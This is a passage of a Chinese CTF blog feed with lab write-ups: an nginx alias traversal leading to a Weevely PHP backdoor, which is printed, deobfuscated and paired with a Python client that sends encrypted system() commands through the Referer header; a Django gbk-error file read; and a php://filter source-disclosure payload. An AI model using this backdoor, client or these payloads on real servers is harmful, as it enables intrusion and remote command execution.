</p><p>注意!alias会丢弃掉loaction的路径,因此alias后面的路径是从系统根目录开始的,然后直接跟指定的路径,他和root的用法不一样,而autoindex是一个目录浏览功能,用于列出当前目录的所有文件及子目录</p><p>总之,这里访问&#x2F;web-ima,就会访问系统跟目录下的&#x2F;images&#x2F;而如果在url中访问&#x2F;web-img..&#x2F;则相当于访问&#x2F;images&#x2F;..&#x2F;,也就相当于访问系统根目录.而且由于开启了autoindex,我们可以直击在浏览器里看到根目录下的所有内容</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208893.png" alt="1646474607851"></p><p>这就是一个目录遍历漏洞,我们可以通过他查看系统中所有文件</p><p>遍历目录可以在&#x2F;var&#x2F;www下找到hack.php.bak</p><h2 id="分析Weevely-Linux中的菜刀-后门代码"><a href="#分析Weevely-Linux中的菜刀-后门代码" class="headerlink" title="分析Weevely(Linux中的菜刀)后门代码"></a>分析Weevely(Linux中的菜刀)后门代码</h2><p>先定义多个变量,然后通过str_replace函数进行字符串的替换并拼接,接着通过create_fuction()创建了一个匿名函数,最后执行这个函数</p><p>str_replace()函数替换拼接后的代码就是匿名函数$f的内容因此这里输出$f,看看函数在干什么</p><pre><code class="php">&lt;?php$U = &#39;_/|U&quot;,&quot;/-/|U&quot;),ar|Uray|U(&quot;/|U&quot;,&quot;+&quot;),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle&#39;;$q = &#39;s[|U$i]=&quot;&quot;;$p=|U$ss($p,3);&#125;|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s))&#123;$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui&#39;;$M = &#39;l=&quot;strtolower|U&quot;;$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$&#39;;$z = &#39;r=@$r[|U&quot;HTTP_R|UEFERER|U&quot;];$r|U|Ua=@$r[&quot;HTTP_A|U|UCCEPT_LAN|UGUAGE|U&quot;];if|U($r|Ur&amp;|U&amp;$ra)&#123;$u=parse_|Uurl($r&#39;;$k = &#39;?:;q=0.([\\|Ud]))?,|U?/&quot;,$ra,$m)|U;if($|Uq&amp;&amp;$m)&#123;|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=&quot;|Usubst|Ur&quot;;|U|U$s&#39;;$o = &#39;|U$l;|U)&#123;for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++)&#123;$o.=$t&#123;$i&#125;|U^$k|U&#123;$j&#125;;&#125;&#125;|Ureturn $|Uo;&#125;$r=$|U_SERV|UE|UR;$r&#39;;$N = &#39;|Uf($e)&#123;$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(&quot;/&#39;;$C = &#39;an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(&quot;|U&lt;$k&gt;$d&lt;/$k&gt;&quot;|U);@ses|U|Usion_des|Utroy();&#125;&#125;&#125;&#125;&#39;;$j = &#39;$k|Uh=&quot;|U|U42f7&quot;;$kf=&quot;e9ac&quot;;fun|Uction|U |Ux($t,$k)&#123;$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U&quot;&quot;;fo|Ur($i=0;$i&lt;&#39;;$R = str_replace(&#39;rO&#39;, &#39;&#39;, &#39;rOcreatrOe_rOrOfurOncrOtion&#39;);$J = &#39;kf|U),|U0,3));$p=&quot;|U&quot;;for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0)&#123;$&#39;;$x = &#39;r)|U;pa|Urse|U_str($u[&quot;qu|U|Uery&quot;],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(&quot;/([\\|U|Uw])[|U\\w-]+|U(&#39;;$f = str_replace(&#39;|U&#39;, &#39;&#39;, $j . $o . $z . $x . $k . $M . $J . $q . $N . $U . $C);echo $f;#这里$kh = &quot;42f7&quot;;#定义两个字符串$kf = &quot;e9ac&quot;;function x($t, $k)#$t的每一项和$k的每一项异或运算,然后循环拼接到输出变量$o中&#123;    $c = strlen($k);    $l = strlen($t);    $o = &quot;&quot;;    for ($i = 0; $i &lt; $l;) &#123;        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;            echo $t&#123;$i&#125;;            $o .= $t&#123;$i&#125; ^ $k&#123;$j&#125;;        &#125;    &#125;    return $o;&#125;#获取服务器环境变量$r = $_SERVER;#获取reffer头$rr = @$r[&quot;HTTP_REFERER&quot;];#at符号（@）在PHP中用作错误控制操作符。当表达式附加@符号时，将忽略该表达式可能生成的错误消息。如果启用了track_errors功能，则表达式生成的错误消息将保存在变量$ php_errormsg中。每个错误都会覆盖此变量。$ra = @$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];#获取浏览器语言if ($rr &amp;&amp; $ra) &#123;    #解析url    $u = parse_url($rr);    /*[query] =&gt; arg=value 这个是查询语句返回的数组中的键值 而下面将查询到的referer中的查询字符串解析为键值对变量,并且保存在数组$q中*/    parse_str($u[&quot;query&quot;], $q);    #返回$q中的所有值    $q = array_values($q);    #执行全局的正则匹配表达式,将结果输出到$m数组中,这个可以单独拿出来看    preg_match_all(&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;, $ra, $m);    /*/([\w])[\w-]+(?:;q=0.([\d]))?,?/    \w匹配字母数字下划线    [\w]匹配数字字母下划线中的任何字符    ([\w]把匹配到的数字字母下划线放到一个分组中    [\w-]匹配数字字母下划线与-中的任何字符    +表示匹配一个或更多个前面的标记连起来就是匹配不止一个数字字母下划线和-    (?:)表示非捕获分组用于单纯的把数个标记组在一起用于后面的?组合匹配    ;q=0表示匹配;q=0这些字符    .表示匹配任何字符不包括换行符    ([\d])\d表示匹配任何数字0-9    ?表示匹配0个或一个前面的标记    (?:;q=0.([\d]))?综合起来就是匹配;q=0任意字符 数字一次但不捕获    ,?表示匹配0次逗号或者一次逗号     * */    if ($q &amp;&amp; $m) &#123;        #屏蔽错误并且开启一个新的session        @session_start();        #$s也同时可以使用$_SESSION的值 ,两个变量指向一个内容        $s =&amp; $_SESSION;        $ss = &quot;substr&quot;;        $sl = &quot;strtolower&quot;;        #拼接前两中语言的首字母        $i = $m[1][0] . $m[1][1];        #在连接预定义字符串截取0-3位,在进行小写转换        $h = $sl($ss(md5($i . $kh), 0, 3));        $f = $sl($ss(md5($i . $kf), 0, 3));</code></pre><p> 需要注意这个正则函数 <code>preg_match_all()</code> , 该函数从 <code>Accept-Language</code> 取值 , 然后通过正则匹配后输出到 $m 数组中 . 单独拿出来看 , $m 数组的输出内容是如下这样的 .  </p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208898.png" alt="1646490699195"></p><pre><code> $m[0] : 所有可选语言及其权重系数 $m[1] : 所有可选语言的首字母 $m[2] : 所有可选语言的权重值( 不清楚该怎么说 , 反正你能明白 )</code></pre><pre><code> 举个例子 : Accept-Language: zh-cn,zh;q=0.5  1. Accept-Language表示浏览器所支持的语言类型 .  2. zh-CN 表示简体中文 , zh 表示中文 , 不同语言之间用逗号分割 . 3. q 是权重系数 , 范围为 [0,1] . q 值越大 , 请求越倾向于获得其对应语言表示的内容 . 若没有指定 q 值，则默认为1 . 若被赋值为0 , 则用于提醒服务器该语言是浏览器不接受的内容类型 .</code></pre><p> 然后拼接了前两种可选语言的首字母 , 和预定义的字符串拼接并进行 md5 校验 , 截取等操作 . 然后赋值给 <code>$h</code> 和 <code>$f</code> 两个变量 </p><pre><code class="php">#$p 应该是指payload,现在还为空        $p = &quot;&quot;;        for ($z = 1; $z &lt; count($m[1]); $z++)            # $m[2]是语言权重的整数值            $p .= $q[$m[2][$z]];        #如果$p 中$h首次出现的位置在开头        if (strpos($p, $h) === 0) &#123;            $s[$i] = &quot;&quot;;            #返回 $p 中的第四个字符到末尾的字符串(即去除$p前三个字符)            $p = $ss($p, 3);        &#125;        #查找数组$s中是否有指定键名$i,即查找$-SESSION中是否存在键名$i        if (array_key_exists($i, $s)) &#123;            # $_SESSION[$i] = $_SESSION[$i] . $p            $s[$i] .= $p;            #$e 为$_SESSION[$i] 中$f第一次出现的位置            $e = strpos($s[$i], $f);</code></pre><p>循环中的 <code>$p .= $q[$m[2][$z]]</code> 会不断从 <code>$q</code> 中提取数据 . 结合之前的代码 , 攻击代码是放在 <code>Referer</code> 中的( 最后会放在 <code>$q</code> 中 ) , 因此这里可以看作是拼接攻击代码 , 组合成 Payload . ‘</p><p>然后判断 $h 是否出现在 Payload 的开头 , 若是则设置 <code>$_SESSION[&#39;$i&#39;] = &quot;&quot;</code>  , 同时删除 Payload 的 $h 部分 . </p><p>接着判断 <code>$_SESSION</code> 中那个是否存在 <code>$i</code> 这个键名 , 若是则将 Payload 赋值给 <code>$_SESSION[$i]</code> , 然后查找 <code>$_SESSION[$i]</code>( 也就是 Payload ) 中 <code>$f</code> 第一次出现的位置 .</p><pre><code class="php"> if ($e) &#123;                #$k = 42f7e9ac                $k = $kh . $kf;                ob_start();                /*这段比较复杂                $ss($s[i],0,$e) 先删除了$_SESSION[$i] 中的 $f.                 preg_replace():将剩余部分中的&#39;_&#39;和&#39;-&#39;替换为&#39;/&#39;和&#39;+&#39;                base64_decode():然后对替换后的内容进行base64解码                x():接着对其进行那个异或加密,该函数在开头定义了                gzuncompress():解压一个压缩字符串                最后通过eval执行                 * */                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&quot;/_/&quot;, &quot;/-/&quot;), array(&quot;/&quot;, &quot;+&quot;), $ss($s[$i], 0, $e))), $k)));                # 返回输出缓冲区内容到$o                $o = ob_get_contents();                #清空缓冲区并关闭输出缓冲                ob_end_clean();                #对缓冲区输入内容通过gzcompress()函数压缩,通过x()异或加密,通过base64编码                $d = base64_encode(x(gzcompress($o), $k));                print(&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;);                #销毁一个会话中的所有数据                @session_destroy();            &#125;        &#125;    &#125;&#125;$g=create_function(&#39;&#39;,$f);$g();?&gt;</code></pre><p>紧跟上面的上面的代码,若payload中找到了$f第一次出现的位置,(也就是说明$f在payload中),就会继续执行如下过程.</p><ol><li>生成密钥$k,该值由预定义的两个字符串拼接而成,然后打开输出控制缓冲区</li><li>截取payload中从开头到$f出现位置的这部分字符串(由此可以判断$f应该是出现在payload的末尾,这里删去$f)</li><li>利用pre_replace()函数,正则替换字符串中的’_’和’-‘为’&#x2F;‘和’+’</li><li>替换后的字符串进行base64_decode解码操作</li><li>对解码后的字符串进行循环异或运算(就是调用x()函数)</li><li>对计算后的字符串调用gzuncompress()函数进行压缩</li><li>通过eval()函数执行压缩后的字符串</li><li>返回输出到缓冲区的内容,然后清空并关闭输出缓冲区</li><li>对缓冲区输出的内容通过gzcompress()函数进行压缩,再通过x()函数进行循环异或运算,最后通过base64_encode编码输出</li></ol><p>整个后门代码的思路就是应该如上,攻击者通过referer传输攻击代码,这段攻击代码的格式应该为填充字符串+加密混淆后的payload+填充字符串.</p><p>该后门脚本接受到攻击者传送的数据包,先按照一定的顺序取出攻击代码,然后把前面两侧的填充字符串去除,拿到payload,然后对payload进行解密反混淆操作,接着通过eval函数执行攻击者指定的命令,最后通过命令执行结果加密编码呈现给攻击者</p><p>整体的解密流程还是非常清晰的,我们知道了后门是如何处理攻击者发送的恶意数据包,但是我们现在还没有连接脚本.无法构造出后门能处理的请求.因此这里需要逆向整个解密流程,以便构造出请求的数据包</p><h2 id="逆向分析后门解密过程"><a href="#逆向分析后门解密过程" class="headerlink" title="逆向分析后门解密过程"></a>逆向分析后门解密过程</h2><p>我们需要根据解密流程构造出加密过程,其主要过程如下所示</p><ol><li><p>定义一些变量与函数</p><pre><code class="php">&lt;?php $kh = &quot;42f7&quot;; $kf = &quot;e9ac&quot;; $k = &quot;42f7e9ac&quot;;#$k = $kh.$kf$language = &quot;en,zh-CN;q=0.9,zh;q=8,zh-TW;q=0.7&quot;;#假设的 Accept-Languagepreg_match_all(&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;,$language,$m);#输出$m 数组$i = &quot;ez&quot;;#$i = $m[1][0].$m[1][1];$m[1][0] = &quot;e&quot; , $m[1][1] = &quot;z&quot;$h = strtolower(substr(md5($i.$kh),0,3));$f = strtolower(substr(md5($i.$kf),0,3));#定义x()函数#由于异或运算是循环的(A ^ B ^ B = A),因此加密解密函数不变function x($t,$k)&#123;    $c = strlen($k);    $l = strlen($t);    $o = &quot;&quot;;    for ($i = 0;$i &lt; $l;)&#123;        for ($j = 0;($j &lt; $c &amp;&amp; $i &lt; $l);$j++,$i++)&#123;            $o .= $t[$i] ^ $k[$j]; #php在7.4不在使用花括号访问数组或者字符串的偏移量需要将&#123;&#125;换成[]解决,这里先放着        &#125;    &#125;    return $o;&#125;echo x($h,$f);</code></pre><p> 这里主要提一下函数x(),正如注释里写的由于 A ^ B ^ B &#x3D; A这个特性,所以加密过程和机密过程的x() 是完全相同的</p></li><li><p>构造payload</p><pre><code class="PHP">#构造payload$payload1 = &quot;phpinfo()&quot;;#假设payload1为phpinfo();$payload2 = @gzcompress($payload1);#gzuncompress 逆向操作$payload3 = @x($payload2,$k);#因为是异或运算,就无所谓逆向不逆向$payload4 = @base64_encode($payload3);#base64-decode逆向操作$payload5 = preg_match(array(&quot;/\//&quot;,&quot;/\+/&quot;),array(&quot;_&quot;,&quot;-&quot;),$payload4); #逆向正则替换$payload6 = $payload5.$f;# 在末尾补齐$f$payload7 = $h . $payload6;#在开头补全$h$payload = $payload7;#根据源代码 $p .=$q[$m[2][$z]];可以看出 $payload 拼接自 $q, $p来自与 HTTP_REFERER#因此这里要构造 referer$referer = &quot;http://example.cpm/?a=qwer&amp;b=$payload&quot;;#解密时会按照一定的顺序从referer 中取出payload,但是加密过程不需要这一步echo $referer,PHP_EOL;</code></pre><p> 结合加密过程的内容,构造的payload过程</p></li><li><p>对收到的数据包的处理</p><p> 因为后门会在eval()处理完毕后返回输出信息,且输出信息是被加密过的,因此还需要一个解密过程</p><pre><code class="php">$output = &quot;xxx&quot;;#假设这是收到的响应数据$o1 = base64_decode($output);$o2 = x($o1,$k);$o3 = gzuncompress($output);</code></pre><p> 以上就是整个加密构造payload并接收响应数据的流程,思路还是比较简单的</p><p> 现在就需要构造出最终的连接脚本</p></li></ol><h2 id="构造构造连接脚本"><a href="#构造构造连接脚本" class="headerlink" title="构造构造连接脚本"></a>构造构造连接脚本</h2><ol><li><p>因为从referer中提取的payload的殊勋依赖于Accept-Language,而不同的客户端发送的Accept-Language可能不一样,因此这里需要一个函数来辅助生成随机的可选语言及权重值</p><pre><code class="python"># 用于生成随机的 Accept-Languageimport base64import randomimport reimport string# from idlelib.debugger_r import debuggingimport urllib.parseimport zlibfrom hashlib import md5import requestsfrom urllib3.connectionpool import xrangedef choicePart(seq, amount):    # 获取seq的长度    length = len(seq)    # 如果长度等于零或者长度小于amount的值就打印错误返回空值    if length == 0 or length &lt; amount:        print(&#39;Error Input&#39;)        # 返回空值        return None    result = []  # 定义结果数组    indexes = []  # 定义索引数组    count = 0    # 当count &lt; amount时就    while count &lt; amount:        i = random.randint(0, length - 1)        if not i in indexes:  # 如果i不在indexes数组里面            indexes.append(i)  # 就追加上i            result.append(seq[i])  # result数组就追加seq的第i位字符            count += 1  # count+一            if count == amount:  # 如果和amount参数值相等                return result  # 就返回值# 生成随机填充字符串(由所有ASCII字符组成,可以不包括不可读的字符)def rand_bytes_flow(amount):    result = &#39;&#39;    for i in range(amount):  # 这里产生0 - amount 的数字        result += chr(random.randint(0, 255))  # 返回一个随机字符串    return result</code></pre><p> 先判断输入的序列串是否为空,不为空就建立result数组,并循环经序列串中的值添加到result数组中,这里的序列串的是可以是可选语言,也可以是权重值,最后返回result数组</p></li><li><p>因为实际攻击代码的组成为随机填充数据+payload+随机填充数据,并且构造交互式shell也需要随机填充数据,因此这里需要创建函数来生成随机数来填充数据</p><pre><code class="python"># 生成随机填充字符串(由所有ASCII字符组成,可以不包括不可读的字符)def rand_bytes_flow(amount):    result = &#39;&#39;    for i in range(amount):  # 这里产生0 - amount 的数字        result += chr(random.randint(0, 255))  # 返回一个随机字符串    return result# 生成随机填充字符串(有所有大小写字符组成)def rand_alpha(amount):    result = &#39;&#39;    for i in range(amount):        # choice() 方法返回一个列表,元素或字符串的随机项        # string.ascii_letters 会生成所有字母        result += random.choice(string.ascii_letters)    return result</code></pre><p> 这里创建了两个函数,分别对应不同的情况</p></li><li><p>循环异或函数</p><pre><code class="python">#模拟x()函数,循环异或加密def loop_xor(text,key):    result = &#39;&#39;    len_key = len(key)    len_text = len(text)    i = 0    while i &lt; len_text:        j = 0        while i &lt; len_text and j &lt; len_key:            result += chr(ord(key[j]) ^ ord(text[i]))            i += 1            j += 1    return  result</code></pre><p> 代码中x()函数</p></li><li><p>开启debug</p><pre><code class="python">#开启debug选项def debug_Print(msg):    if debugging:        print(msg)</code></pre><p>  这个可开可不开 , 开启 Debug 有助于代码分析 </p></li><li><p>定义基本变量</p><pre><code class="python"># 定义基本变量debugging = False  # 默认关闭debug,可用true开启keyh = &quot;42f7&quot;  # $kh,需要更改keyf = &quot;e9ac&quot;  # $kf,需要更改xor_key = keyh + keyf  # $k异或密钥url = &#39;http://111.200.241.244:61732/hack.php&#39;  # 指定url,需要更改defaultlang = &#39;zh-CH&#39;  # 默认Languagelanguages = [&#39;zh-TW;q=0.%d&#39;, &#39;zh-HK;q=0.%d&#39;, &#39;en-US;q=0.%d&#39;, &#39;en;q=0.%d&#39;]  # Accept-Language 模板proxies = &#123;&#39;http&#39;: &#39;http://127.0.0.1:8080&#39;&#125;  # 代理,可用burpsuite截取sess = requests.Session()  # 创建一个session对象</code></pre></li><li><p>生成完整的Accept-Language和payload两侧填充的随机填充空白</p><pre><code class="python"># 每次会话产生一次随机的 Accept-Languagelang_tmp = choicePart(languages, 3)  # 这里先输出了一个列表,里面包含模板中的三种Aceept-languageindexes = sorted(choicePart(range(1, 10), 3), reverse=True)  # 首先返回了一个三个数字的数组并且按照降序进行排序 例如[8,7,2]accept_lang = [defaultlang]  # 先添加默认langguagefor i in range(3):    accept_lang.append(lang_tmp[i] % (indexes[i]))accept_lang_str = &#39;,&#39;.join(accept_lang)  # 使用,连接数组中的元素使其反回一个字符串# accep_lang_str就是要使用的Accept-language#print(accept_lang_str)init2Char = accept_lang[0][0] + accept_lang[1][0]  # $i 这里的就是数组中的 字符串 所以是二维数组md5 = md5()md5.update((init2Char + keyh).encode())md5head = (md5.hexdigest())[0:3]  # 这块首先进行连接在返回md5值,再返回16进制的数据字符串值 在进行截取前三位md5.update((init2Char + keyf).encode())md5tail = (md5.hexdigest())[0:3] + rand_alpha(random.randint(3, 8))  # $f + 填充字符串 在进行连接随机数量的填充字符</code></pre></li><li><p>构造payload<strong>这里有点问题在python3 中没有找到合适的函数进行解密</strong></p><pre><code class="python"># 构造payload# 交互式shellcmd = &quot;system(&#39;&quot; + input(&#39;shell &gt; &#39;) + &quot;&#39;);&quot;  # 其中input函数是从命令行获取标准输入并返回字符串while cmd != &#39;&#39;:    # 在写入payload前填充一些无关数据    query = []    for i in range(max(indexes) + 1 + random.randint(0, 2)):        key = rand_alpha(random.randint(3, 6))        value = base64.urlsafe_b64encode(            (rand_bytes_flow(random.randint(3, 12))).encode()).decode()  # 转换为适合url传输的base64格式        query.append((key, value))    # 对payload进行加密    payload = (zlib.compress(&#39;cmd&#39;.encode())).decode(&#39;utf-8&#39;,errors=&#39;ignore&#39;)    print(payload) # 使用zlib.compress进行压缩操作 就是compress操作而这里的cmd是字符串而非bytes类型所以使用嗯code进行编码    payload = loop_xor(payload, xor_key)  # 进行循环异或运算,相当于PHP代码中的x函数    payload = base64.urlsafe_b64encode(payload.encode()).decode()  # 进行url的base64编码    payload = md5head + str(payload)   # print(payload)# 在开头补全$h 而这里的payload 是bytes类型所以转换成str    # 对payload进行修改1    cut_index = random.randint(2, len(payload) - 3)    payload_pieces = (payload[0:cut_index], payload[cut_index:], md5tail)    i_piece = 0    for i in indexes:        query[i] = (query[i][0], payload_pieces[i_piece])        i_piece += 1    # 将payload作为查询字符串编码拼接到referer中    referer = url + &#39;?&#39; + urllib.parse.urlencode(query)</code></pre><p> 这里的代码用于构造payload,包括添加payload两侧的随机填充数据,payload本身的加密,最终把加密混淆后的payload作为参数值传输到referer中</p></li><li><p>发送请求数据,并接收处理响应数据</p><p> 攻击代码写好了,下面仅需要发送请求并接收数据,解密后即可查看到攻击者的命令执行结果</p><pre><code class="python">headers = &#123;&#39;Accept-Language&#39;: accept_lang_str        , &#39;Referer&#39;: referer               &#125;    req = sess.get(url, headers=headers, proxies=proxies)    #print(req.text)    html = req.text    # 接收响应数据包    pattern = re.compile(r&#39;&lt;%s&gt;(.*)&lt;/%s&gt;&#39; % (xor_key, xor_key))    output = pattern.findall(html)    #print(output)    # 如果没有响应包,则对其进行处理    if len(output) == 0:        print(&#39;Error, no backdoor response&#39;)        cmd = &quot;system(&#39;&quot; + input(&#39;shell &gt; &#39;) + &quot;&#39;);&quot;        continue    # 如果收到响应数据包,则对其进行处理    output = output[0]    output = output.encode(&#39;base64&#39;)  # base64_decode解码    output = loop_xor(output, xor_key)  # 循环异或运算    output = zlib.decompress(output.encode())  # geuncompress 运算    print(output)  # 输出响应信息    cmd = &quot;system(&#39;&quot; + input(&#39;shell &gt; &#39;) + &quot;&#39;);&quot;</code></pre><p> 连接脚本获得数据</p><p> <img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208904.png" alt="1646569346034"></p></li></ol><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208908.png" alt="1646569355167"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界cat</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccat/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccat/</url>
      
        <content type="html"><![CDATA[<h1 id="后端django服务gbk编码导致宽字符绕过"><a href="#后端django服务gbk编码导致宽字符绕过" class="headerlink" title="后端django服务gbk编码导致宽字符绕过"></a>后端django服务gbk编码导致宽字符绕过</h1><p>打开发现一个ping命令输入127.0.0.1发现执行成功,推测可能是命令拼接,但是输入任何有关拼接的字符串会提示invalid url </p><p>写一个脚本测试一下过滤了哪些字符</p><pre><code class="python">import requestsdef fuzz(location):    url = location.split(&#39;?&#39;)[0]    param = location.split(&#39;?&#39;)[1].split(&#39;=&#39;)[0]    #print(param)    with open (&#39;./命令执行payload.txt&#39;) as file:        payload_list = file.readlines()    for payload in payload_list:        payload =payload.strip(&quot;\n&quot;)       # print(payload)        params = &#123;            param:payload        &#125;        #print(params)        res = requests.get(url=url,params=params)        if &#39;Invalid URL&#39; in res.text:            pass        else:            print(f&#39;未被过滤的字符:&#123;payload&#125;&#39;)if __name__ == &#39;__main__&#39;:   fuzz(&#39;http://111.200.241.244:55466/index.php?url=a&#39;)&#39;&#39;&#39;未被过滤的字符:@未被过滤的字符:-未被过滤的字符:.未被过滤的字符:/&#39;&#39;&#39;</code></pre><p>输入@发现在地址栏上@转换成了%40说明有编码转换</p><pre><code>http://111.200.241.244:55466/index.php?url=%40</code></pre><p>在url处输入宽字符,比如%bf</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101051385.png" alt="image-20220310105149299"></p><p>出现报错信息,将代码复制出来,使用浏览器打开</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101052150.png" alt="image-20220310105214023"></p><p>可以看到这是django的报错页面,看来是将输入的参数传到了后端的django服务中进行解析,而django设置了编码为gbk导致错误编码了宽字符(超过了ascii码的范围)</p><p>这里可以发现是通过post请求方式进行的而又根据之前@符号未进行过滤</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101052487.png" alt="image-20220310105233434"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101054620.png" alt="image-20220310105428400"></p><p>这里还需要懂一些django开发的基本知识，我感觉这道题涉及的面有点广了，django项目下一般有个settings.py文件是设置网站数据库路径（django默认使用的的是sqlites数据库），如果使用的是其它数据库的话settings.py则设置用户名和密码。除此外settings.py还会对项目整体的设置进行定义。</p><p>读取settings.py文件，这里需要注意django项目生成时settings.py会存放在以项目目录下再以项目名称命名的文件夹下面。</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101054951.png" alt="image-20220310105445854"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101054712.png" alt="image-20220310105456612"></p><p>接着使用@访问这个文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101055492.png" alt="image-20220310105512413"></p><pre><code>http://111.200.241.244:55466/index.php?url=@/opt/api/database.sqlite3</code></pre><p>在响应中搜索ctf ,flag找到</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101055850.png" alt="image-20220310105530764"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界ics-05</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cics-05/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cics-05/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界ics-05-preg-replace-函数-x2F-e-漏洞"><a href="#攻防世界ics-05-preg-replace-函数-x2F-e-漏洞" class="headerlink" title="攻防世界ics-05(preg_replace()函数 &#x2F;e 漏洞)"></a>攻防世界ics-05(preg_replace()函数 &#x2F;e 漏洞)</h1><p>查阅资料发现这里是一个文件包含漏洞</p><pre><code>http://111.200.241.244:60854/index.php?page=index.php</code></pre><p>使用php:&#x2F;&#x2F;filter协议用于读取源码, php:&#x2F;&#x2F;input用于执行php代码</p><p>再次使用php:&#x2F;&#x2F;filter&#x2F;read&#x3D; 参数读取文件</p><p>在使用转换过滤器php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;进行base64的编码</p><p>之后再次使用resource&#x3D;参数来过滤筛选过滤的数据流</p><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php进行读取</p><p>具体实例</p><pre><code>http://111.200.241.244:60854/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</code></pre><p>得到源码</p><pre><code class="php">&lt;?phperror_reporting(0);@session_start();posix_setuid(1000);?&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;meta name=&quot;renderer&quot; content=&quot;webkit&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;layui/css/layui.css&quot; media=&quot;all&quot;&gt;    &lt;title&gt;设备维护中心&lt;/title&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;ul class=&quot;layui-nav&quot;&gt;        &lt;li class=&quot;layui-nav-item layui-this&quot;&gt;&lt;a href=&quot;?page=index&quot;&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt;    &lt;/ul&gt;    &lt;fieldset class=&quot;layui-elem-field layui-field-title&quot; style=&quot;margin-top: 30px;&quot;&gt;        &lt;legend&gt;设备列表&lt;/legend&gt;    &lt;/fieldset&gt;    &lt;table class=&quot;layui-hide&quot; id=&quot;test&quot;&gt;&lt;/table&gt;    &lt;script type=&quot;text/html&quot; id=&quot;switchTpl&quot;&gt;        &lt;!-- 这里的 checked 的状态只是演示 --&gt;        &lt;input type=&quot;checkbox&quot; name=&quot;sex&quot; value=&quot;&#123;&#123;d.id&#125;&#125;&quot; lay-skin=&quot;switch&quot; lay-text=&quot;开|关&quot; lay-filter=&quot;checkDemo&quot; &#123;&#123; d.id==1 0003 ? 'checked' : '' &#125;&#125;&gt;    &lt;/script&gt;    &lt;script src=&quot;layui/layui.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;    &lt;script&gt;    layui.use(&#39;table&#39;, function() &#123;        var table = layui.table,            form = layui.form;        table.render(&#123;            elem: &#39;#test&#39;,            url: &#39;/somrthing.json&#39;,            cellMinWidth: 80,            cols: [                [                    &#123; type: &#39;numbers&#39; &#125;,                     &#123; type: &#39;checkbox&#39; &#125;,                     &#123; field: &#39;id&#39;, title: &#39;ID&#39;, width: 100, unresize: true, sort: true &#125;,                     &#123; field: &#39;name&#39;, title: &#39;设备名&#39;, templet: &#39;#nameTpl&#39; &#125;,                     &#123; field: &#39;area&#39;, title: 